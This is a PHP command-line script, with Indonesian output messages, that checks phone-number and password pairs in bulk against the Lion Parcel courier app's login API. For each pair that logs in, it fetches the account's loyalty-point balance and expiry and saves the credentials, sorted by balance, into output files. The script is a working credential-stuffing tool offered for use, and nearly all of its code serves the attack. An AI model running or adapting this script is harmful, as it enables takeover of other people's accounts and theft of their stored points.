<?php

error_reporting(0);
date_default_timezone_set("Asia/Jakarta");

$colors = new \Colors();
echo "-------------- ".$colors->getColoredString("LION PARCEL CHECKER", "green")." ----------------".PHP_EOL.PHP_EOL;
fileList:
$fileName = input("[ ".date("H:i:s")." ] File List");
if(!file_exists($fileName)) {
    echo "[ ".date("H:i:s")." ] ".$colors->getColoredString("File ".$fileName." Tidak Ditemukan", "red").PHP_EOL;
    goto fileList;
} else {
    echo "[ ".date("H:i:s")." ] ".$colors->getColoredString("File ".$fileName." Ditemukan", "green").PHP_EOL.PHP_EOL;
}

$listAkun = explode("\n",str_replace("\r","",file_get_contents($fileName)));
$no = 1;
foreach($listAkun as $format) {
    if(!is_numeric(strpos($format, "|"))) {
        die("[ ".date("H:i:s")." ] ".$colors->getColoredString("Pisah Nomor Hp Dan Password Pake | Goblog!!", "green")).PHP_EOL;
    }

    $AkunLion = explode("|", $format);
    $nomorHP1 = $AkunLion[0];
    if(!preg_match('/[^+0-9]/',trim($nomorHP1))){
        if (substr(trim($nomorHP1), 0, 3) == '+62'){
            $nomorHP = trim($nomorHP1);
        } else if (substr(trim($nomorHP1), 0, 1) == '0'){
            $nomorHP = '+62'.substr(trim($nomorHP1), 1);
        } else {
            $nomorHP = '+62'.trim($nomorHP1);
        }
    }
    $password = $AkunLion[1];

    echo "[ ".date("H:i:s")." ] [".$no."/".count($listAkun)."] ".$colors->getColoredString(trim($nomorHP)."|".trim($password), "green");
    $data = '{"password":"'.$password.'","phone_number":"'.$nomorHP.'","role":"CUSTOMER"}';
    $contentLength = strlen($data);
    $headers = [
        "Host: algo-api.lionparcel.com",
        "cache-control: max-age=0",
        "content-type: application/json; charset=UTF-8", 
        "content-length: ".$contentLength, 
        "user-agent: okhttp/5.0.0-alpha.6",
    ];

    $login = curl("https://algo-api.lionparcel.com/v2/account/auth/login", $data, $headers);
    $token = get_between($login[1], '{"token":"', '",');
    if($token) {
        echo " >> ".$colors->getColoredString("Login Berhasil", "green");
        $headers = [
            "Host: algo-api.lionparcel.com",
            "authorization: Bearer ".$token,
            "cache-control: max-age=0",
            "user-agent: okhttp/5.0.0-alpha.6",
        ];
        $cekSaldo       = curlget("https://algo-api.lionparcel.com/v1/shipment/balance/current", null, $headers);
        $saldoPoin      = get_between($cekSaldo[1], '"point_total_current_amount":', ',"');
        $expiredPoin    = get_between($cekSaldo[1], '"point_near_expired_at":"', 'T0');
        echo " >> ".$colors->getColoredString("Point: ".$saldoPoin." Exp: [".$expiredPoin."]", "green").PHP_EOL;
        if(!is_dir("AccLionBersaldo")) mkdir("AccLionBersaldo");
        if ($saldoPoin > 10000) {
            file_put_contents("AccLionBersaldo/BerPoint.txt", trim($nomorHP)."|".trim($password)."|Point: ".$saldoPoin." |Exp: [".$expiredPoin."]".PHP_EOL, FILE_APPEND);
        } else if ($saldoPoin == 10000) {
            file_put_contents("AccLionBersaldo/Berpoint_10K.txt", trim($nomorHP)."|".trim($password)."|Point: ".$saldoPoin." |Exp: [".$expiredPoin."]".PHP_EOL, FILE_APPEND);
        } else {
            file_put_contents("AccLionBersaldo/Miskin_Point.txt", trim($nomorHP)."|".trim($password)."|Point: ".$saldoPoin." |Exp: [".$expiredPoin."]".PHP_EOL, FILE_APPEND);
        }    
    } else {
        echo " >> ".$colors->getColoredString("Login Gagal", "red").PHP_EOL;
    }
    $no++;
}

echo PHP_EOL.$colors->getColoredString("Sukses, Hasil Disimpan di Folder AccLionBersaldo", "green").PHP_EOL;

function input($text) {
    echo $text."? ";
    $a = trim(fgets(STDIN));
    return $a;
}

function get_between($string, $start, $end) 
    {
        $string = " ".$string;
        $ini = strpos($string,$start);
        if ($ini == 0) return "";
        $ini += strlen($start);
        $len = strpos($string,$end,$ini) - $ini;
        return substr($string,$ini,$len);
    }



function curl($url,$post,$headers)
{
	$ch = curl_init();
	curl_setopt($ch, CURLOPT_URL, $url);
	curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($ch, CURLOPT_HEADER, 1);
    curl_setopt($ch, CURLOPT_POST, 1);
	if ($headers !== null) curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
    if ($post !== null) curl_setopt($ch, CURLOPT_POSTFIELDS, $post);
	$result = curl_exec($ch);
	$header = substr($result, 0, curl_getinfo($ch, CURLINFO_HEADER_SIZE));
	$body = substr($result, curl_getinfo($ch, CURLINFO_HEADER_SIZE));
	preg_match_all("/^Set-Cookie:\s*([^;]*)/mi", $result, $matches);
	$cookies = array()
;	foreach($matches[1] as $item) {
	  parse_str($item, $cookie);
	  $cookies = array_merge($cookies, $cookie);
	}
	return array (
	$header,
	$body,
	$cookies
	);
}


function curlget($url,$post,$headers)
{
	$ch = curl_init();
	curl_setopt($ch, CURLOPT_URL, $url);
	curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($ch, CURLOPT_HEADER, 1);
    $headers == null ? curl_setopt($ch, CURLOPT_POST, 1) : curl_setopt($ch, CURLOPT_HTTPGET, 1);
	if ($headers !== null) curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
    curl_setopt($ch, CURLOPT_CUSTOMREQUEST, "GET");
	$result = curl_exec($ch);
	$header = substr($result, 0, curl_getinfo($ch, CURLINFO_HEADER_SIZE));
	$body = substr($result, curl_getinfo($ch, CURLINFO_HEADER_SIZE));
	preg_match_all("/^Set-Cookie:\s*([^;]*)/mi", $result, $matches);
	$cookies = array()
;	foreach($matches[1] as $item) {
	  parse_str($item, $cookie);
	  $cookies = array_merge($cookies, $cookie);
	}
	return array (
	$header,
	$body,
	$cookies
	);
}

class Colors {
    private $foreground_colors = array();
    private $background_colors = array();

    public function __construct() {
        // Set up shell colors
        $this->foreground_colors["black"] = "0;30";
        $this->foreground_colors["dark_gray"] = "1;30";
        $this->foreground_colors["blue"] = "0;34";
        $this->foreground_colors["light_blue"] = "1;34";
        $this->foreground_colors["green"] = "0;32";
        $this->foreground_colors["light_green"] = "1;32";
        $this->foreground_colors["cyan"] = "0;36";
        $this->foreground_colors["light_cyan"] = "1;36";
        $this->foreground_colors["red"] = "0;31";
        $this->foreground_colors["light_red"] = "1;31";
        $this->foreground_colors["purple"] = "0;35";
        $this->foreground_colors["light_purple"] = "1;35";
        $this->foreground_colors["brown"] = "0;33";
        $this->foreground_colors["yellow"] = "1;33";
        $this->foreground_colors["light_gray"] = "0;37";
        $this->foreground_colors["white"] = "1;37";

        $this->background_colors["black"] = "40";
        $this->background_colors["red"] = "41";
        $this->background_colors["green"] = "42";
        $this->background_colors["yellow"] = "43";
        $this->background_colors["blue"] = "44";
        $this->background_colors["magenta"] = "45";
        $this->background_colors["cyan"] = "46";
        $this->background_colors["light_gray"] = "47";
    }

    // Returns colored string
    public function getColoredString($string, $foreground_color = null, $background_color = null) {
        $colored_string = "";

        // Check if given foreground color found
        if (isset($this->foreground_colors[$foreground_color])) {
            $colored_string .= "\033[" . $this->foreground_colors[$foreground_color] . "m";
        }
        // Check if given background color found
        if (isset($this->background_colors[$background_color])) {
            $colored_string .= "\033[" . $this->background_colors[$background_color] . "m";
        }

        // Add string and end coloring
        $colored_string .=  $string . "\033[0m";

        return $colored_string;
    }

    // Returns all foreground color names
    public function getForegroundColors() {
        return array_keys($this->foreground_colors);
    }

    // Returns all background color names
    public function getBackgroundColors() {
        return array_keys($this->background_colors);
    }
}
